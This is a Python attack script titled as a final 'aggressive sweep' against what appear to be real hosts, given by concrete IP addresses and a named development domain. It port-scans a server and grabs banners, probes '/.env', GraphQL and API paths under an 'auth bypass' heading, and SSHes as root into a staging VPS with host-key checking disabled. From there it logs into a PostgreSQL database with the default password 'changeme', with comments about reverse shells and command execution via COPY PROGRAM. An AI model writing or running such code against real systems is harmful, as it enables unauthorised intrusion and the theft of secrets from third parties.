#!/usr/bin/env python3
"""Final aggressive sweep - all remaining vectors"""
import subprocess, socket, sys, json, urllib.request, urllib.error

# 1. BULT app port scan
print("=== BULT SERVER PORTS ===")
host = "135.181.80.227"
for p in [22, 80, 443, 3000, 3001, 8080, 8443, 9090, 5000, 8000, 9000]:
    s = socket.socket()
    s.settimeout(2)
    if s.connect_ex((host, p)) == 0:
        print(f"  Port {p}: OPEN")
        if p in [80, 443, 8080, 3000]:
            proto = "https" if p in [443, 8443] else "http"
            try:
                r = urllib.request.urlopen(f"{proto}://{host}:{p}/", timeout=3)
                print(f"    HTTP {r.getcode()}: {r.read(100)[:80]}")
            except urllib.error.HTTPError as e:
                print(f"    HTTP {e.code}")
            except Exception as e:
                print(f"    Error: {str(e)[:60]}")
    s.close()

# 2. Rails container full scan via PostgreSQL COPY
print("\n=== RAILS CONTAINER SCAN ===")
print("(via PostgreSQL COPY PROGRAM - run on VPS)")

# 3. PostgreSQL reverse shell
print("\n=== POSTGRESQL COMMAND EXECUTION ===")
print("Can execute commands as postgres user in container")
print("Testing shell access...")

try:
    r = subprocess.run(
        ["pg_isready", "-h", "38.107.234.149"],
        capture_output=True, text=True, timeout=5
    )
    print(f"  pg_isready: {r.stdout}")
except:
    print("  pg_isready not found")

# 4. VPS based PostgreSQL command
print("\n=== TRY PG FROM VPS ===")
ssh_cmd = [
    "ssh", "-i", "/Users/mufasaai/.ssh/hexstrike_vps",
    "-o", "StrictHostKeyChecking=no",
    "-o", "ConnectTimeout=10",
    "root@78.27.235.70",
    "PGPASSWORD=changeme psql -h 38.107.234.149 -U lago -d lago -c 'SELECT 1' 2>&1 | head -3"
]
try:
    r = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=15)
    print(f"  PG via VPS: {r.stdout[:100]}")
except Exception as e:
    print(f"  PG via VPS failed: {e}")

# 5. BULT app auth bypass
print("\n=== BULT APP CHECK ===")
urls = [
    "http://135.181.80.227:80/",
    "https://app.dev.bult.host/api/",
    "https://app.dev.bult.host/graphql",
    "https://app.dev.bult.host/.env",
]
for url in urls:
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read(200)
            print(f"  {url} -> HTTP {r.getcode()} ({len(body)}b)")
    except urllib.error.HTTPError as e:
        print(f"  {url} -> HTTP {e.code}")
    except Exception as e:
        pass
